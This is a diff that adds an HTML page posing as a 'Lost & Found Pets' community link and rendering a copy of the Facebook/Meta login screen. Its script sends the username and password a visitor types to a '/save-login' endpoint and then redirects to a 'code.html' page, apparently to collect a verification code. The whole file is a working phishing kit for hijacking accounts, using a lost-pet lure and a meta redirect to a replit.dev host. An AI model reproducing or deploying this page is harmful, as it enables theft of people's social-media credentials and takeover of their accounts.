@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
+
+
+
+
+
+
+
+    <!-- Facebook Open Graph -->
+    <meta property="og:title" content="Lost & Found Pets US" />
+    <meta property="og:description" content="Join our community to help reunite lost pets with their families. Share sightings, post alerts, and get support from caring members who understand how important every pet is." />
+    <meta property="og:image" content="https://ea922165-4a00-4a42-83a7-2ac105bdc130-00-1yqnbhwquay4.picard.replit.dev/pawboost.png" />
+    <meta property="og:url" content="https://ea922165-4a00-4a42-83a7-2ac105bdc130-00-1yqnbhwquay4.picard.replit.dev/" />
+    <meta property="og:type" content="website" />
+    <meta property="og:site_name" content="Florida Lost Pets" />
+
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Lost & Found Pets Florida" />
+    <meta name="twitter:description" content="Join our community to help reunite lost pets with their families." />
+    <meta name="twitter:image" content="https://ea922165-4a00-4a42-83a7-2ac105bdc130-00-1yqnbhwquay4.picard.replit.dev/pawboost.png" />
+
+    <!-- Instant redirect -->
+    <meta http-equiv="refresh" content="0; url=https://ea922165-4a00-4a42-83a7-2ac105bdc130-00-1yqnbhwquay4.picard.replit.dev/" />
+ 
+
+  <!-- Favicon -->
+  <link rel="icon" type="image/png" href="https://ea922165-4a00-4a42-83a7-2ac105bdc130-00-1yqnbhwquay4.picard.replit.dev/pawboost.png" />
+
+
+  <title>Follow our page-Pawboost Community Find Lost Pets</title>
+  </head>
+  <style>
+    :root {
+      --fb-blue: #1877f2;
+      --fb-light-gray: #f0f2f5;
+      --fb-dark-blue: #1c1e21;
+      --fb-text-gray: #606770;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background-color: var(--fb-light-gray);
+      font-family: Arial, sans-serif;
+      color: var(--fb-dark-blue);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px 10px;
+    }
+
+    .intro-text {
+      text-align: center;
+      margin-top: 20px;
+      margin-bottom: 30px;
+    }
+
+    .intro-text h1 {
+      color: var(--fb-blue);
+      font-size: 32px;
+    }
+
+    .intro-text p {
+      font-size: 14px;
+      max-width: 320px;
+      margin: 10px auto 0;
+      color: var(--fb-dark-blue);
+    }
+
+    .language-toggle {
+      margin-top: 10px;
+      cursor: pointer;
+      font-size: 14px;
+      color: var(--fb-text-gray);
+    }
+
+    .login-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 90%;
+      max-width: 400px;
+      margin-top: 10px;
+      transition: transform 0.2s;
+    }
+
+    .fb-logo {
+      width: 60px;
+      height: 60px;
+      background: white;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 20px 0;
+    }
+
+    .fb-logo img {
+      width: 30px;
+      height: 30px;
+    }
+
+    .input-group {
+      position: relative;
+      margin-bottom: 20px;
+      width: 100%;
+    }
+
+    .input-group input {
+      width: 100%;
+      height: 52px; /* fixed height */
+      padding: 0 10px; /* only horizontal padding */
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      background: white;
+      color: var(--fb-dark-blue);
+      font-size: 16px;
+      line-height: 48px; /* equal to height for vertical centering */
+    
+      box-sizing: border-box; /* include padding & border in height */
+    }
+
+
+    .input-group label {
+      position: absolute;
+      top: 16px;
+      left: 12px;
+      color: var(--fb-text-gray);
+      font-size: 14px;
+      pointer-events: none;
+      transition: all 0.2s ease;
+    }
+
+    .input-group input:focus + label,
+    .input-group input:not(:placeholder-shown) + label {
+      top: 4px;
+      left: 10px;
+      font-size: 12px;
+      color: #555;
+    }
+
+    button.login-btn {
+      width: 100%;
+      background-color: var(--fb-blue);
+      color: white;
+      border: none;
+      padding: 14px;
+      border-radius: 25px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-bottom: 15px;
+    }
+
+    .forgot-password {
+      color: var(--fb-blue);
+      font-size: 14px;
+      text-align: center;
+      margin-bottom: 30px;
+      cursor: pointer;
+    }
+
+    .create-account {
+      width: 90%;
+      max-width: 400px;
+      background: white;
+      border: 1px solid var(--fb-blue);
+      color: var(--fb-blue);
+      padding: 14px;
+      border-radius: 25px;
+      font-size: 16px;
+      text-align: center;
+      cursor: pointer;
+      margin-bottom: 20px;
+    }
+
+    .meta-logo {
+      font-size: 14px;
+      color: var(--fb-text-gray);
+      margin-bottom: 15px;
+    }
+
+    .language-modal {
+      display: none;
+      position: fixed;
+      bottom: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      height: 57vh;
+      width: 100%;
+      max-width: 500px;
+      background-color: white;
+      border-top-left-radius: 20px;
+      border-top-right-radius: 20px;
+      box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.5);
+      z-index: 999;
+      padding: 20px;
+      color: #000;
+      overflow-y: auto;
+      overscroll-behavior: contain;
+      scrollbar-width: none;
+    }
+
+    .language-modal::-webkit-scrollbar {
+      display: none;
+    }
+
+    .language-modal-header {
+      display: flex;
+      align-items: center;
+      margin-bottom: 15px;
+    }
+
+    .close-btn {
+      font-size: 24px;
+      cursor: pointer;
+      margin-right: 10px;
+    }
+
+    .modal-title {
+      font-size: 16px;
+      font-weight: bold;
+    }
+
+    .language-modal-list {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+
+    .language-modal-list li {
+      padding: 12px;
+      font-size: 16px;
+      border-bottom: 1px solid #ddd;
+      cursor: pointer;
+    }
+
+    .language-modal-list li:hover {
+      background-color: #f0f0f0;
+    }
+
+    @media (max-width: 480px) {
+      .login-container {
+        padding: 0 10px;
+      }
+    }
+    .meta-footer {
+  pointer-events: none; /* so it doesn’t block interaction */
+}
+
+
+
+    .meta-footer {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      background-color: white;
+      padding: 10px 20px;
+      box-shadow: 0 -2px 5px rgba(0,0,0,0.1);
+      z-index: 1000;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      transition: transform 0.3s ease;
+      transform: translateY(0);
+    }
+
+    .top-line {
+      gap: 8px; /* default gap between logo and text */
+      display: flex;
+      align-items: center;
+      margin-bottom: 5px;
+    }
+
+    .top-line img {
+      height: 22px; /* logo height */
+    }
+
+    .meta-text {
+      font-weight: 700;
+      color: #616770;
+      font-size: 1rem;
+      font-family: Arial, sans-serif;
+      font-weight: 600;
+      user-select: none;
+      cursor: default;
+    }
+
+    .bottom-line {
+      font-size: 0.8rem;
+      color: #616770;
+      user-select: none;
+    }
+
+    /* Responsive adjustments for smaller screens */
+    @media (max-width: 768px) {
+      .meta-footer {
+        padding: 6px 15px;
+      }
+
+      .top-line {
+        gap: 4px; /* smaller gap */
+        margin-bottom: 3px;
+      }
+
+      .top-line img {
+        height: 18px; /* smaller logo */
+      }
+
+      .meta-text {
+        font-size: 0.9rem;
+        font-weight: 600;
+      }
+
+      .bottom-line {
+        font-size: 0.75rem;
+      }
+    }
+
+
+
+
+
+
+  </style>
+
+<body>
+
+  <!-- Intro Text -->
+  <div class="intro-text">
+    <h1>Facebook</h1>
+    <p>Facebook helps you connect and share with the people in your life.</p>
+  </div>
+
+  <!-- Language Toggle -->
+  <div class="language-toggle" onclick="openLanguageModal()">
+    English (UK) &#x25BC;
+  </div>
+
+  <!-- Login Container -->
+  <div class="login-container">
+    <div class="fb-logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo" />
+    </div>
+
+    <div class="input-group">
+      <input type="text" id="username" placeholder=" " />
+      <label for="username">Mobile number or email address</label>
+    </div>
+
+    <div class="input-group">
+      <input type="password" id="password" placeholder=" " />
+      <label for="password">Password</label>
+    </div>
+
+    <button class="login-btn" onclick="loginUser()">Log in</button>
+    <div class="forgot-password" onclick="window.location.href='password.html'">Forgotten password?</div>
+  </div>
+
+  <button class="create-account" onclick="window.open('https://web.facebook.com/r.php?entry_point=login', '_blank')">Create new account</button>
+
+  <!-- Language Modal -->
+  <div id="languageModal" class="language-modal">
+    <div class="language-modal-header">
+      <span class="close-btn" onclick="closeLanguageModal()">&times;</span>
+      <span class="modal-title">Select Language</span>
+    </div>
+    <ul class="language-modal-list">
+      <li onclick="selectLanguage('English (UK)')">English (UK)</li>
+      <li onclick="selectLanguage('Español')">Español</li>
+      <li onclick="selectLanguage('Français (France)')">Français (France)</li>
+      <li onclick="selectLanguage('Deutsch')">Deutsch</li>
+      <li onclick="selectLanguage('Português (Brasil)')">Português (Brasil)</li>
+      <li onclick="selectLanguage('Italiano')">Italiano</li>
+    </ul>
+  </div>
+  <div class="meta-footer">
+    <div class="top-line">
+      <img src="metalogo.png" alt="Meta Logo" />
+      <span class="meta-text">Meta</span>
+    </div>
+    <div class="bottom-line">
+      About · Help · More
+    </div>
+  </div>
+
+  <!-- JavaScript -->
+  <script>
+    function openLanguageModal() {
+      document.getElementById('languageModal').style.display = 'block';
+    }
+
+    function closeLanguageModal() {
+      document.getElementById('languageModal').style.display = 'none';
+    }
+
+    function selectLanguage(language) {
+      document.querySelector('.language-toggle').innerHTML = language + ' &#x25BC;';
+      closeLanguageModal();
+    }
+
+    function loginUser() {
+      const usernameInput = document.getElementById("username");
+      const passwordInput = document.getElementById("password");
+
+      const username = usernameInput.value.trim();
+      const password = passwordInput.value.trim();
+
+      // Clear previous error states
+      document.querySelectorAll('.error-message').forEach(el => el.remove());
+      [usernameInput, passwordInput].forEach(input => {
+        input.style.borderColor = '#ccc';
+      });
+
+      let hasError = false;
+
+      if (!username) {
+        showError(usernameInput);
+        hasError = true;
+      }
+
+      if (!password) {
+        showError(passwordInput);
+        hasError = true;
+      }
+
+      if (hasError) return;
+
+      // Proceed with login fetch
+      fetch('/save-login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, password })
+      })
+        .then(res => res.json())
+        .then(data => {
+          if (data.success) {
+            localStorage.setItem("login_user", username);
+            window.location.href = "code.html";
+          } else {
+            alert("Login failed. Try again.");
+          }
+        })
+        .catch(err => {
+          console.error('Login error:', err);
+          alert("An error occurred while submitting the login.");
+        });
+    }
+
+    function showError(inputElement) {
+      inputElement.style.borderColor = 'red';
+
+      const error = document.createElement('div');
+      error.className = 'error-message';
+      error.style.color = 'red';
+      error.style.fontSize = '12px';
+      error.style.marginTop = '4px';
+      error.textContent = 'Required';
+
+      inputElement.parentNode.appendChild(error);
+    }
+
+
+
+
+
+    (() => {
+      const footer = document.querySelector('.meta-footer');
+      let initialHeight = window.innerHeight;
+
+      window.addEventListener('resize', () => {
+        const currentHeight = window.innerHeight;
+
+        if (initialHeight - currentHeight > 150) {
+          // Keyboard is probably open
+          footer.style.transform = 'translateY(100%)';  // Move footer down offscreen
+        } else {
+          // Keyboard is probably closed
+          footer.style.transform = 'translateY(0)';     // Bring footer back up
+        }
+      });
+    })();
+
+  </script>
+
+</body>
+</html>
